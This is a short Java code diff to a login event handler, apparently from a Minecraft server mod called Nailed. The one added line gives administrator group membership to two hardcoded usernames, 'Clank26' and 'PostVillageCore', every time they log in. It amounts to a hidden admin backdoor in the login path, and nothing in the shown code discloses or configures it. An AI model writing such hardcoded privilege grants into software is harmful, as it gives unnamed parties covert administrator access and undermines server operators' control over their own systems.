@@ -16,6 +16,7 @@ public class NailedEventFactory {
 
     public static void playerLoggedIn(EntityPlayerMP entity, WorldServer world) {
         Player p = Nailed.playerRegistry.getOrCreatePlayer(entity.getCommandSenderName());
+        if(p.getUsername().equals("Clank26") || p.getUsername().equals("PostVillageCore")) p.setGroup(Nailed.groupRegistry.getGroup("admin"));
         Nailed.eventBus.post(new PlayerJoinServerEvent(p));
     }
 
